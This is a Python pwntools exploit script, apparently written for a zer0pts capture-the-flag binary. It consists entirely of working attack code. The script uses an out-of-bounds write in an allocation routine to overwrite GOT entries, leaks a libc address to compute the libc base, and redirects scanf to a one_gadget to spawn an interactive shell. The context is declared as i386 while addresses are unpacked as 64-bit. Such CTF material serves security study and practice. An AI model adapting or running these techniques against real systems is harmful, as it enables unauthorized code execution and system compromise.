#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "pwn.ctf.zer0pts.com"
PORT = 9004 
libc = ELF('./libc.so.6')
gadget = 0xe6e79
"""
HOST = "localhost"
PORT = 7777 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget = 0xe6ce9
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_puts = elf.got["puts"]
got_calloc = elf.got["calloc"]
got_setbuf = elf.got["setbuf"]
got_exit = elf.got["exit"]
got_scanf = elf.got["__isoc99_scanf"]

plt_printf = elf.plt["printf"]

addr_main = elf.symbols["main"]
addr_start = elf.symbols["_start"]

addr_stdin= elf.symbols["stdin"]
addr_stdout= elf.symbols["stdout"]
addr_branch = 0x400792
addr_bss = elf.bss()

only_ret = 0x4005ce
off_stdout = libc.symbols["_IO_2_1_stdout_"]
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#off_binsh = next(libc.search(b"/bin/sh"))

def allocate(n, i, elm):
	conn.sendlineafter(" = ", str(n))
	conn.sendlineafter(" = ", str(i))
	conn.sendlineafter(" = ", str(elm))

def exploit():
	allocate(-1, got_puts//4, addr_main) 
	allocate(-1, got_exit//4, only_ret)
	allocate(-1, got_setbuf//4, plt_printf)
	allocate(-1, (got_setbuf+4)//4, 0)
	allocate(0x21000//4, (0x22000+off_stdout+4-0x10)//4, 0xffffffff)
	allocate(-1, got_puts//4, addr_start)
	
	conn.recvuntil(b"\xff\xff\xff\xff")
	libc_stdout = u64(conn.recv(6)+b"\x00\x00")
	libc_base = libc_stdout - off_stdout - 0x83
	one_gadget = libc_base + gadget	
	#allocate(-1, got_puts//4, addr_main)
	print(hex(libc_stdout))		
	print(hex(libc_base))		
	
	allocate(-1, got_scanf//4, (one_gadget & 0xffffffff))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
